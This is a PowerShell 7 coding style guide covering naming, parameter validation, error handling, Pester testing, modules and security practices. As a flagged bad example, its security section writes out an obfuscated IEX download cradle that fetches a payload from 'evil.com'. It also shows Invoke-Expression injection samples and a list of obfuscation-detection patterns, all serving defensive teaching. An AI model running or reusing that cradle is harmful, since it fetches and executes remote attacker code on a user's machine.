---
title: "PowerShell Style Guide"
description: "Cross-platform PowerShell 7+ scripting standards for automation and infrastructure management"
author: "Tyler Dukes"
date: "2025-10-28"
tags: [powershell, scripting, cross-platform, automation, windows, infrastructure]
category: "Language Guides"
status: "active"
version: "1.0.0"
---

## Language Overview

**PowerShell** is a cross-platform task automation solution consisting of a command-line shell, scripting
language, and configuration management framework. This guide focuses on PowerShell 7+ (PowerShell Core) for
cross-platform compatibility.

### Key Characteristics

- **Paradigm**: Object-oriented, pipeline-based scripting
- **Case Sensitivity**: Case-insensitive by default
- **File Extensions**: `.ps1` (scripts), `.psm1` (modules), `.psd1` (manifests)
- **Primary Use**: System administration, automation, CI/CD, infrastructure management
- **Platforms**: Windows, Linux, macOS

### Supported Versions

- **PowerShell 7.2+**: Long-term support (LTS) versions
- **PowerShell 7.4+**: Current stable version

---

## Quick Reference

| **Category** | **Convention** | **Example** | **Notes** |
|-------------|----------------|-------------|-----------|
| **Naming** | | | |
| Functions | `Verb-Noun` PascalCase | `Get-UserData`, `Set-Configuration` | Use approved verbs |
| Variables | `$PascalCase` | `$UserName`, `$ApiUrl` | Descriptive names |
| Parameters | `PascalCase` | `[string]$FilePath` | No `$` in declaration |
| Constants | `$UPPER_CASE` | `$MAX_RETRIES` | Uppercase for clarity |
| Private Functions | `Verb-Noun` | Same as public | No special prefix needed |
| **Files** | | | |
| Scripts | `Verb-Noun.ps1` | `Deploy-Application.ps1` | PascalCase with `.ps1` |
| Modules | `ModuleName.psm1` | `MyUtilities.psm1` | PascalCase with `.psm1` |
| Manifests | `ModuleName.psd1` | `MyUtilities.psd1` | Module metadata |
| **Formatting** | | | |
| Indentation | 4 spaces | `if ($condition) {` | 4 spaces per level |
| Line Length | 115 characters | `# Reasonable max` | Keep lines readable |
| Braces | Same line opening | `if ($x) {` | K&R style |
| **Syntax** | | | |
| Comparison | `-eq`, `-ne`, `-lt`, `-gt` | `if ($x -eq 5)` | Not `==`, `!=` |
| String Quotes | Single `'` or double `"` | `'static'`, `"$variable"` | Double for interpolation |
| Comments | `#` for line, `<# #>` for block | `# Comment` | Hash for comments |
| **Parameters** | | | |
| Type | Always specify | `[string]$Path` | Strong typing |
| Validation | Use attributes | `[ValidateNotNullOrEmpty()]` | Built-in validation |
| Mandatory | Mark required | `[Parameter(Mandatory=$true)]` | Required parameters |
| **Best Practices** | | | |
| Error Handling | Use try/catch | `try { } catch { }` | Structured error handling |
| Cmdlet Binding | Use `[CmdletBinding()]` | Advanced functions | Enable advanced features |
| Pipeline | Support pipeline | `[Parameter(ValueFromPipeline)]` | Accept pipeline input |
| Write Output | Use `Write-Output` | Not `Write-Host` | Proper output stream |

---

## Naming Conventions

### Functions and Cmdlets

Use **PascalCase** with **Verb-Noun** pattern using approved verbs:

```powershell
## Good - Approved verb + PascalCase noun
function Get-UserProfile { }
function Set-ServiceConfiguration { }
function New-DeploymentPackage { }
function Remove-TemporaryFiles { }

## Bad - Unapproved verb or incorrect casing
function Fetch-UserProfile { }      # Use Get, not Fetch
function get-userProfile { }        # Incorrect casing
function Delete-TempFiles { }       # Use Remove, not Delete
```

### Approved Verbs

Use `Get-Verb` to see all approved verbs. Common categories:

```powershell
## Data Operations
Get, Set, New, Remove, Clear, Add, Copy, Move

## Lifecycle
Start, Stop, Restart, Enable, Disable, Initialize, Complete

## Diagnostics
Debug, Trace, Measure, Test, Watch, Confirm

## Communication
Send, Receive, Read, Write, Invoke, Connect, Disconnect
```

### Variables

Use **PascalCase** for variables:

```powershell
## Good
$UserName = "john.doe"
$ServiceEndpoint = "https://api.example.com"
$MaxRetryCount = 3

## Bad - Incorrect casing
$username = "john.doe"
$service_endpoint = "https://api.example.com"
```

### Constants and Configuration

Use **UPPER_SNAKE_CASE** for constants:

```powershell
## Good
$MAX_TIMEOUT_SECONDS = 300
$DEFAULT_API_VERSION = "v1"
$LOG_FILE_PATH = "/var/log/app.log"
```

---

## Function Structure

### Basic Function

```powershell
function Get-UserProfile {
    <#
    .SYNOPSIS
    Retrieves user profile information from Active Directory.

    .DESCRIPTION
    Queries Active Directory for detailed user profile information including
    display name, email, department, and manager.

    .PARAMETER UserName
    The SAM account name of the user to query.

    .PARAMETER IncludeManager
    Include manager information in the output.

    .EXAMPLE
    Get-UserProfile -UserName "jdoe"

    .EXAMPLE
    Get-UserProfile -UserName "jdoe" -IncludeManager

    .OUTPUTS
    PSCustomObject with user profile properties.

    .NOTES
    Requires Active Directory PowerShell module.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [string]$UserName,

        [Parameter(Mandatory = $false)]
        [switch]$IncludeManager
    )

    begin {
        Write-Verbose "Starting user profile retrieval for: $UserName"
    }

    process {
        try {
            $User = Get-ADUser -Identity $UserName -Properties DisplayName, EmailAddress, Department, Manager

            $Profile = [PSCustomObject]@{
                UserName    = $User.SamAccountName
                DisplayName = $User.DisplayName
                Email       = $User.EmailAddress
                Department  = $User.Department
            }

            if ($IncludeManager -and $User.Manager) {
                $Manager = Get-ADUser -Identity $User.Manager -Properties DisplayName
                $Profile | Add-Member -MemberType NoteProperty -Name Manager -Value $Manager.DisplayName
            }

            return $Profile
        }
        catch {
            Write-Error "Failed to retrieve user profile for '$UserName': $_"
            throw
        }
    }

    end {
        Write-Verbose "User profile retrieval completed"
    }
}
```

### Advanced Function with Pipeline Support

```powershell
function Set-ServiceConfiguration {
    [CmdletBinding(SupportsShouldProcess = $true, ConfirmImpact = 'Medium')]
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [string[]]$ServiceName,

        [Parameter(Mandatory = $true)]
        [ValidateSet('Running', 'Stopped', 'Paused')]
        [string]$DesiredState,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Automatic', 'Manual', 'Disabled')]
        [string]$StartupType
    )

    begin {
        Write-Verbose "Configuring services with desired state: $DesiredState"
        $Results = @()
    }

    process {
        foreach ($Service in $ServiceName) {
            if ($PSCmdlet.ShouldProcess($Service, "Set configuration")) {
                try {
                    $ServiceObj = Get-Service -Name $Service -ErrorAction Stop

                    # Set startup type if specified
                    if ($PSBoundParameters.ContainsKey('StartupType')) {
                        Set-Service -Name $Service -StartupType $StartupType
                        Write-Verbose "Set startup type to '$StartupType' for service: $Service"
                    }

                    # Set desired state
                    switch ($DesiredState) {
                        'Running' { Start-Service -Name $Service }
                        'Stopped' { Stop-Service -Name $Service }
                        'Paused'  { Suspend-Service -Name $Service }
                    }

                    $Results += [PSCustomObject]@{
                        ServiceName = $Service
                        Status      = (Get-Service -Name $Service).Status
                        StartupType = (Get-Service -Name $Service).StartType
                        Success     = $true
                    }
                }
                catch {
                    Write-Error "Failed to configure service '$Service': $_"
                    $Results += [PSCustomObject]@{
                        ServiceName = $Service
                        Status      = $null
                        StartupType = $null
                        Success     = $false
                    }
                }
            }
        }
    }

    end {
        return $Results
    }
}
```

---

## Parameters and Validation

### Parameter Attributes

```powershell
function New-UserAccount {
    [CmdletBinding()]
    param(
        # Mandatory parameter with validation
        [Parameter(Mandatory = $true, Position = 0)]
        [ValidateNotNullOrEmpty()]
        [ValidateLength(3, 20)]
        [string]$UserName,

        # Email validation
        [Parameter(Mandatory = $true)]
        [ValidatePattern('^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$')]
        [string]$Email,

        # Range validation
        [Parameter(Mandatory = $false)]
        [ValidateRange(1, 120)]
        [int]$Age = 18,

        # Set validation
        [Parameter(Mandatory = $false)]
        [ValidateSet('Admin', 'User', 'Guest')]
        [string]$Role = 'User',

        # Script validation
        [Parameter(Mandatory = $false)]
        [ValidateScript({ Test-Path $_ -PathType Container })]
        [string]$HomeDirectory,

        # Count validation
        [Parameter(Mandatory = $false)]
        [ValidateCount(1, 5)]
        [string[]]$Groups
    )

    # Function implementation
}
```

### Parameter Sets

```powershell
function Get-LogData {
    [CmdletBinding(DefaultParameterSetName = 'ByDate')]
    param(
        # ByDate parameter set
        [Parameter(Mandatory = $true, ParameterSetName = 'ByDate')]
        [datetime]$StartDate,

        [Parameter(Mandatory = $true, ParameterSetName = 'ByDate')]
        [datetime]$EndDate,

        # ByCount parameter set
        [Parameter(Mandatory = $true, ParameterSetName = 'ByCount')]
        [ValidateRange(1, 1000)]
        [int]$Count,

        # Common parameter across all sets
        [Parameter(Mandatory = $false)]
        [string]$LogLevel = 'Info'
    )

    switch ($PSCmdlet.ParameterSetName) {
        'ByDate' {
            Get-WinEvent -FilterHashtable @{
                LogName   = 'Application'
                StartTime = $StartDate
                EndTime   = $EndDate
            } | Where-Object { $_.LevelDisplayName -eq $LogLevel }
        }
        'ByCount' {
            Get-WinEvent -LogName 'Application' -MaxEvents $Count |
                Where-Object { $_.LevelDisplayName -eq $LogLevel }
        }
    }
}
```

---

## Error Handling

### Try-Catch-Finally

```powershell
function Invoke-ApiRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$Endpoint,

        [Parameter(Mandatory = $false)]
        [int]$MaxRetries = 3
    )

    $AttemptCount = 0
    $Success = $false

    while (-not $Success -and $AttemptCount -lt $MaxRetries) {
        $AttemptCount++
        Write-Verbose "API request attempt $AttemptCount of $MaxRetries"

        try {
            $Response = Invoke-RestMethod -Uri $Endpoint -Method Get -ErrorAction Stop
            $Success = $true
            return $Response
        }
        catch [System.Net.WebException] {
            Write-Warning "Network error on attempt $AttemptCount: $($_.Exception.Message)"
            if ($AttemptCount -eq $MaxRetries) {
                Write-Error "Max retries reached. Request failed."
                throw
            }
            Start-Sleep -Seconds (2 * $AttemptCount)
        }
        catch {
            Write-Error "Unexpected error: $($_.Exception.Message)"
            throw
        }
        finally {
            Write-Verbose "Completed attempt $AttemptCount"
        }
    }
}
```

### ErrorAction and ErrorVariable

```powershell
## Suppress errors for specific commands
$Service = Get-Service -Name 'NonExistentService' -ErrorAction SilentlyContinue

if ($null -eq $Service) {
    Write-Warning "Service not found, creating..."
}

## Capture errors for analysis
Get-Process -Name 'chrome' -ErrorAction SilentlyContinue -ErrorVariable ProcessErrors
if ($ProcessErrors) {
    Write-Error "Failed to get process: $($ProcessErrors[0].Exception.Message)"
}
```

---

## Pipeline Usage

### Pipeline-Aware Functions

```powershell
function Export-UserData {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, ValueFromPipeline = $true)]
        [PSCustomObject[]]$User,

        [Parameter(Mandatory = $true)]
        [string]$OutputPath
    )

    begin {
        Write-Verbose "Starting user data export to: $OutputPath"
        $AllUsers = @()
    }

    process {
        $AllUsers += $User
    }

    end {
        $AllUsers | Export-Csv -Path $OutputPath -NoTypeInformation
        Write-Verbose "Exported $($AllUsers.Count) users to $OutputPath"
    }
}

## Usage
Get-ADUser -Filter * | Export-UserData -OutputPath 'users.csv'
```

### Pipeline Best Practices

```powershell
## Good - Efficient pipeline usage
Get-Process | Where-Object { $_.WorkingSet -gt 100MB } | Sort-Object WorkingSet -Descending | Select-Object -First 10

## Good - Named parameters for clarity
Get-ChildItem -Path C:\Logs -Filter *.log |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-30) } |
    Remove-Item -Force

## Avoid - Unnecessary loops when pipeline works
## Bad
$Files = Get-ChildItem -Path C:\Logs
foreach ($File in $Files) {
    Remove-Item -Path $File.FullName
}

## Good
Get-ChildItem -Path C:\Logs | Remove-Item
```

---

## Module Structure

### Module Layout

```text
MyModule/
├── MyModule.psd1          # Module manifest
├── MyModule.psm1          # Root module script
├── Public/                # Exported functions
│   ├── Get-MyData.ps1
│   └── Set-MyData.ps1
├── Private/               # Internal functions
│   └── ConvertTo-MyFormat.ps1
├── Classes/               # PowerShell classes
│   └── MyClass.ps1
├── Tests/                 # Pester tests
│   ├── MyModule.Tests.ps1
│   └── Integration.Tests.ps1
└── en-US/                 # Help files
    └── MyModule-help.xml
```

### Module Manifest (.psd1)

```powershell
@{
    RootModule        = 'MyModule.psm1'
    ModuleVersion     = '1.0.0'
    GUID              = '12345678-1234-1234-1234-123456789012'
    Author            = 'Tyler Dukes'
    CompanyName       = 'Dukes Engineering'
    Copyright         = '(c) 2025 Tyler Dukes. All rights reserved.'
    Description       = 'Module for managing application deployments'
    PowerShellVersion = '7.2'

    FunctionsToExport = @('Get-MyData', 'Set-MyData')
    CmdletsToExport   = @()
    VariablesToExport = @()
    AliasesToExport   = @()

    RequiredModules   = @('Microsoft.PowerShell.Management')

    PrivateData = @{
        PSData = @{
            Tags       = @('Automation', 'Deployment')
            LicenseUri = 'https://github.com/myorg/MyModule/blob/main/LICENSE'
            ProjectUri = 'https://github.com/myorg/MyModule'
        }
    }
}
```

### Root Module (.psm1)

```powershell
## MyModule.psm1

## Import all public functions
$PublicFunctions = @(Get-ChildItem -Path $PSScriptRoot\Public\*.ps1 -ErrorAction SilentlyContinue)
foreach ($Function in $PublicFunctions) {
    try {
        . $Function.FullName
    }
    catch {
        Write-Error "Failed to import function $($Function.FullName): $_"
    }
}

## Import all private functions
$PrivateFunctions = @(Get-ChildItem -Path $PSScriptRoot\Private\*.ps1 -ErrorAction SilentlyContinue)
foreach ($Function in $PrivateFunctions) {
    try {
        . $Function.FullName
    }
    catch {
        Write-Error "Failed to import private function $($Function.FullName): $_"
    }
}

## Export only public functions
Export-ModuleMember -Function $PublicFunctions.BaseName
```

---

## Testing with Pester

### Basic Pester Test

```powershell
## Get-UserProfile.Tests.ps1
BeforeAll {
    . $PSScriptRoot/../Public/Get-UserProfile.ps1
}

Describe 'Get-UserProfile' {
    Context 'Parameter validation' {
        It 'Should require UserName parameter' {
            { Get-UserProfile } | Should -Throw
        }

        It 'Should accept valid UserName' {
            { Get-UserProfile -UserName 'jdoe' } | Should -Not -Throw
        }
    }

    Context 'User retrieval' {
        BeforeEach {
            Mock Get-ADUser {
                return [PSCustomObject]@{
                    SamAccountName = 'jdoe'
                    DisplayName    = 'John Doe'
                    EmailAddress   = 'jdoe@example.com'
                    Department     = 'IT'
                }
            }
        }

        It 'Should return user profile object' {
            $Result = Get-UserProfile -UserName 'jdoe'
            $Result | Should -Not -BeNullOrEmpty
            $Result.UserName | Should -Be 'jdoe'
        }

        It 'Should include email address' {
            $Result = Get-UserProfile -UserName 'jdoe'
            $Result.Email | Should -Match '^\w+@\w+\.\w+$'
        }
    }
}
```

---

## PSScriptAnalyzer Configuration

### .pslintrc.psd1

```powershell
@{
    Rules = @{
        PSAvoidUsingCmdletAliases = @{
            Enable = $true
        }
        PSAvoidUsingWriteHost = @{
            Enable = $true
        }
        PSUseApprovedVerbs = @{
            Enable = $true
        }
        PSUseDeclaredVarsMoreThanAssignments = @{
            Enable = $true
        }
        PSProvideCommentHelp = @{
            Enable = $true
        }
    }
    ExcludeRules = @(
        'PSAvoidUsingInvokeExpression'
    )
    Severity = @('Error', 'Warning')
}
```

### Running PSScriptAnalyzer

```powershell
## Analyze single file
Invoke-ScriptAnalyzer -Path .\MyScript.ps1

## Analyze entire directory
Invoke-ScriptAnalyzer -Path .\MyModule -Recurse

## With custom settings
Invoke-ScriptAnalyzer -Path .\MyModule -Settings .\.pslintrc.psd1
```

---

## Anti-Patterns

### ❌ Avoid: Using Aliases in Scripts

```powershell
## Bad - Aliases reduce readability
gci | ? { $_.Length -gt 1MB } | % { ri $_ }

## Good - Full cmdlet names
Get-ChildItem | Where-Object { $_.Length -gt 1MB } | ForEach-Object { Remove-Item $_ }
```

### ❌ Avoid: Write-Host for Output

```powershell
## Bad - Write-Host cannot be captured
function Get-ComputerStatus {
    Write-Host "Computer is online"
}

## Good - Use Write-Output or return
function Get-ComputerStatus {
    return [PSCustomObject]@{
        Status = 'Online'
    }
}
```

### ❌ Avoid: Unapproved Verbs

```powershell
## Bad - Unapproved verbs
function Fetch-UserData { }
function Delete-OldFiles { }

## Good - Approved verbs
function Get-UserData { }
function Remove-OldFiles { }
```

### ❌ Avoid: Not Using Parameter Validation

```powershell
## Bad - No validation
function Set-UserAge {
    param($Age)
    # No validation - can accept invalid values
    $User.Age = $Age
}

## Good - With validation
function Set-UserAge {
    param(
        [Parameter(Mandatory=$true)]
        [ValidateRange(0, 150)]
        [int]$Age
    )
    $User.Age = $Age
}
```

### ❌ Avoid: Using Positional Parameters in Scripts

```powershell
## Bad - Positional parameters are unclear
Get-ChildItem C:\Temp *.txt $true

## Good - Named parameters
Get-ChildItem -Path C:\Temp -Filter *.txt -Recurse
```

### ❌ Avoid: Suppressing Errors with Out-Null

```powershell
## Bad - Hiding errors
Remove-Item $file -ErrorAction SilentlyContinue 2>&1 | Out-Null

## Good - Explicit error handling
try {
    Remove-Item $file -ErrorAction Stop
} catch {
    Write-Warning "Failed to remove $file: $_"
}
```

### ❌ Avoid: Not Using Splatting for Many Parameters

```powershell
## Bad - Long parameter list
New-ADUser -Name "John Doe" -SamAccountName "jdoe" `
  -UserPrincipalName "jdoe@contoso.com" `
  -Path "OU=Users,DC=contoso,DC=com" -AccountPassword $password -Enabled $true

## Good - Use splatting
$userParams = @{
    Name              = "John Doe"
    SamAccountName    = "jdoe"
    UserPrincipalName = "jdoe@contoso.com"
    Path              = "OU=Users,DC=contoso,DC=com"
    AccountPassword   = $password
    Enabled           = $true
}
New-ADUser @userParams
```

---

## Security Best Practices

### Execution Policy and Script Signing

Use proper execution policies and sign scripts:

```powershell
## Bad - Bypassing execution policy
PowerShell.exe -ExecutionPolicy Bypass -File script.ps1  # ❌ Security risk!

## Good - Use RemoteSigned or AllSigned
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

## Good - Sign scripts
$cert = Get-ChildItem Cert:\CurrentUser\My -CodeSigningCert
Set-AuthenticodeSignature -FilePath .\script.ps1 -Certificate $cert

## Good - Verify signature before execution
$signature = Get-AuthenticodeSignature -FilePath .\script.ps1
if ($signature.Status -ne 'Valid') {
    throw "Script signature is invalid!"
}
```

**Key Points**:

- Never use `-ExecutionPolicy Bypass` in production
- Sign all production scripts
- Use `AllSigned` policy for maximum security
- Verify signatures before execution
- Store code signing certificates securely
- Use timestamp servers when signing

### Secure Credential Management

Never hardcode credentials:

```powershell
## Bad - Hardcoded credentials
$username = "admin"
$password = "Password123"  # ❌ Exposed!
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)

## Good - Use Get-Credential
$credential = Get-Credential -UserName "admin" -Message "Enter password"

## Good - Use Secret Management module
Install-Module -Name Microsoft.PowerShell.SecretManagement
Install-Module -Name SecretManagement.Keychain  # macOS
# Or: SecretManagement.KeePass, SecretManagement.LastPass

Set-Secret -Name "ServiceAccount" -Secret (Get-Credential)
$credential = Get-Secret -Name "ServiceAccount" -AsPlainText

## Good - Azure Key Vault
$secret = Get-AzKeyVaultSecret -VaultName "MyVault" -Name "DbPassword"
$credential = New-Object PSCredential("admin", $secret.SecretValue)

## Good - Never log credentials
function Connect-Database {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [PSCredential]$Credential
    )
    # Credential automatically masked in verbose output
    Write-Verbose "Connecting as $($Credential.UserName)"  # ✅ Password not logged
}
```

**Key Points**:

- Never hardcode passwords in scripts
- Use `PSCredential` objects
- Use Secret Management modules
- Leverage cloud secret stores (Azure Key Vault, AWS Secrets Manager)
- Never log or display `SecureString` values
- Rotate credentials regularly

### Input Validation and Injection Prevention

Validate all inputs to prevent injection attacks:

```powershell
## Bad - No validation (injection risk)
param($Username)
Invoke-Expression "net user $Username /delete"  # ❌ Command injection!

## Good - Validate inputs
param(
    [Parameter(Mandatory)]
    [ValidatePattern('^[a-zA-Z0-9_-]+$')]
    [ValidateLength(1, 20)]
    [string]$Username
)
Remove-LocalUser -Name $Username  # ✅ Safe cmdlet

## Good - Use parameter validation
function Remove-UserAccount {
    param(
        [Parameter(Mandatory)]
        [ValidateSet('Dev', 'Test', 'Prod')]
        [string]$Environment,

        [Parameter(Mandatory)]
        [ValidateScript({
            if ($_ -match '^[a-zA-Z0-9_-]+$') { $true }
            else { throw "Invalid username format" }
        })]
        [string]$Username
    )

    Remove-LocalUser -Name $Username
}

## Good - Avoid Invoke-Expression
## Bad
$command = "Get-Process -Name $processName"  # User input
Invoke-Expression $command  # ❌ Code injection!

## Good
Get-Process -Name $processName  # ✅ Direct cmdlet call
```

**Key Points**:

- Always validate user inputs
- Use `ValidatePattern`, `ValidateSet`, `ValidateScript`
- Never use `Invoke-Expression` with user input
- Use cmdlets instead of string commands
- Sanitize inputs before file operations
- Use parameter binding, not string concatenation

### Secure File Operations

Prevent path traversal and unauthorized file access:

```powershell
## Bad - Path traversal vulnerability
param($FileName)
$content = Get-Content "C:\Data\$FileName"  # ❌ Can access ../../../Windows/System32

## Good - Validate and resolve paths
param(
    [Parameter(Mandatory)]
    [ValidateScript({
        if ($_ -notmatch '\.\./') { $true }
        else { throw "Path traversal detected" }
    })]
    [string]$FileName
)

$basePath = "C:\Data"
$fullPath = Join-Path $basePath $FileName | Resolve-Path
if (-not $fullPath.Path.StartsWith($basePath)) {
    throw "Access denied: path outside allowed directory"
}
$content = Get-Content $fullPath

## Good - Set restrictive file permissions
$acl = Get-Acl "C:\Secrets\config.json"
$acl.SetAccessRuleProtection($true, $false)  # Disable inheritance
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
    "BUILTIN\Administrators", "FullControl", "Allow"
)
$acl.AddAccessRule($rule)
Set-Acl "C:\Secrets\config.json" $acl

## Good - Verify checksums
function Get-FileIfValid {
    param(
        [string]$Url,
        [string]$ExpectedHash
    )

    $tempFile = New-TemporaryFile
    Invoke-WebRequest -Uri $Url -OutFile $tempFile

    $actualHash = (Get-FileHash $tempFile -Algorithm SHA256).Hash
    if ($actualHash -ne $ExpectedHash) {
        Remove-Item $tempFile
        throw "Hash mismatch! File may be tampered."
    }

    return $tempFile
}
```

**Key Points**:

- Validate file paths to prevent traversal
- Use `Resolve-Path` and verify resolved paths
- Set appropriate ACLs on sensitive files
- Verify file hashes after download
- Never trust user-provided paths
- Use temporary files for downloads

### Least Privilege Execution

Run scripts with minimal required privileges:

```powershell
## Bad - Requiring admin for everything
#Requires -RunAsAdministrator
# Entire script runs as admin even if not needed

## Good - Check and request elevation only when needed
function Install-Application {
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )) {
        throw "This function requires administrator privileges"
    }

    # Admin-only operations here
}

## Good - Use RunAs for specific commands
$credential = Get-Credential
Invoke-Command -ComputerName localhost -Credential $credential -ScriptBlock {
    Install-WindowsFeature -Name Web-Server
}

## Good - Separate privileged and non-privileged operations
function Deploy-Application {
    # Non-privileged operations
    Test-Configuration
    Build-Application

    # Only elevate for installation
    if (Test-IsAdmin) {
        Install-Service
    } else {
        Write-Warning "Run as administrator to install service"
    }
}
```

**Key Points**:

- Don't require admin unless absolutely necessary
- Check for admin rights before privileged operations
- Use `Invoke-Command` with credentials for remote operations
- Separate privileged and non-privileged code
- Document why elevation is needed
- Use service accounts with minimal permissions

### Network Security

Secure network operations:

```powershell
## Bad - Insecure HTTP
Invoke-WebRequest -Uri "http://api.example.com/data"  # ❌ Unencrypted!

## Good - Use HTTPS
Invoke-WebRequest -Uri "https://api.example.com/data"

## Good - Verify SSL certificates
try {
    Invoke-WebRequest -Uri "https://api.example.com/data" `
        -ErrorAction Stop  # Will fail on invalid certs
} catch {
    Write-Error "SSL certificate validation failed: $_"
}

## Good - Use authentication headers securely
$token = Get-Secret -Name "ApiToken" -AsPlainText
$headers = @{
    "Authorization" = "Bearer $token"
}
Invoke-RestMethod -Uri "https://api.example.com/data" -Headers $headers

## Good - Limit TLS versions
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor `
    [Net.SecurityProtocolType]::Tls13
```

**Key Points**:

- Always use HTTPS for network requests
- Verify SSL/TLS certificates
- Use TLS 1.2 or higher
- Never disable certificate validation
- Use secure authentication (OAuth, API keys from vaults)
- Implement request timeouts

### Audit Logging

Log security-relevant operations:

```powershell
## Good - Comprehensive logging
function Remove-UserAccount {
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory)]
        [string]$Username
    )

    $auditLog = "C:\Logs\audit.log"
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $user = $env:USERNAME
    $computer = $env:COMPUTERNAME

    $logEntry = "$timestamp | $computer | $user | Attempting to remove user: $Username"
    Add-Content -Path $auditLog -Value $logEntry

    try {
        if ($PSCmdlet.ShouldProcess($Username, "Remove user account")) {
            Remove-LocalUser -Name $Username -ErrorAction Stop
            $logEntry = "$timestamp | $computer | $user | SUCCESS: Removed user: $Username"
            Add-Content -Path $auditLog -Value $logEntry
        }
    } catch {
        $logEntry = "$timestamp | $computer | $user | FAILED: $($_.Exception.Message)"
        Add-Content -Path $auditLog -Value $logEntry
        throw
    }
}

## Good - Use Windows Event Log
function Write-SecurityEvent {
    param(
        [string]$Message,
        [ValidateSet('Information', 'Warning', 'Error')]
        [string]$Level = 'Information'
    )

    Write-EventLog -LogName Application `
        -Source "MyApplication" `
        -EntryType $Level `
        -EventId 1000 `
        -Message $Message
}
```

**Key Points**:

- Log all security-relevant operations
- Include timestamps, user, and computer
- Log both successes and failures
- Use Windows Event Log for system-level events
- Protect log files with appropriate ACLs
- Implement log rotation
- Monitor logs for suspicious activity

### Script Obfuscation Detection

Avoid and detect obfuscated scripts:

```powershell
## Bad - Obfuscated code (red flag!)
$a='I'+'E'+'X';$b='(Ne'+'w-Ob'+'ject Ne'+'t.WebC'+'lient).Dow'+'nloadStr'+'ing';
&$a($b+"('http://evil.com/payload.ps1')")  # ❌ Malicious obfuscation!

## Good - Clear, readable code
$client = New-Object Net.WebClient
$script = $client.DownloadString('https://trusted-site.com/script.ps1')
# Verify hash before executing
$expectedHash = "ABC123..."
$stream = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($script))
if ((Get-FileHash -InputStream $stream).Hash -eq $expectedHash) {
    Invoke-Expression $script
}

## Good - Detect obfuscation
function Test-ScriptObfuscation {
    param([string]$ScriptPath)

    $content = Get-Content $ScriptPath -Raw

    $suspiciousPatterns = @(
        '[char]\(\d+\)',  # Char code obfuscation
        '\$\w+\s*=\s*[''"][^''"]+[''"]\s*\+',  # String concatenation obfuscation
        '-join\s*\(',  # Join obfuscation
        'iex|Invoke-Expression',  # Dynamic execution
        '\[Convert\]::FromBase64String'  # Base64 encoding
    )

    foreach ($pattern in $suspiciousPatterns) {
        if ($content -match $pattern) {
            Write-Warning "Suspicious pattern detected: $pattern"
            return $false
        }
    }
    return $true
}
```

**Key Points**:

- Never obfuscate your own scripts
- Detect and reject obfuscated scripts
- Be suspicious of base64, char codes, string concatenation
- Use PSScriptAnalyzer to detect suspicious patterns
- Review scripts before execution
- Implement application whitelisting

---

## Tool Configurations

### VSCode settings.json

```json
{
    "powershell.scriptAnalysis.enable": true,
    "powershell.scriptAnalysis.settingsPath": ".pslintrc.psd1",
    "powershell.codeFormatting.preset": "OTBS",
    "powershell.codeFormatting.useCorrectCasing": true,
    "files.associations": {
        "*.ps1": "powershell",
        "*.psm1": "powershell",
        "*.psd1": "powershell"
    }
}
```

---

## References

### Official Documentation

- [PowerShell Documentation](https://docs.microsoft.com/en-us/powershell/)
- [Approved Verbs](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/approved-verbs-for-windows-powershell-commands)
- [PowerShell Best Practices](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-development-guidelines)

### Tools

- [PSScriptAnalyzer](https://github.com/PowerShell/PSScriptAnalyzer) - Static code analyzer
- [Pester](https://pester.dev/) - Testing framework
- [Plaster](https://github.com/PowerShell/Plaster) - Template-based scaffolding
- [PSReadLine](https://github.com/PowerShell/PSReadLine) - Command-line editing

### Style Guides

- [PowerShell Practice and Style Guide](https://poshcode.gitbook.io/powershell-practice-and-style/)
- [The PowerShell Best Practices and Style Guide](https://github.com/PoshCode/PowerShellPracticeAndStyle)

---

**Version**: 1.0.0
**Last Updated**: 2025-10-28
**Status**: Active
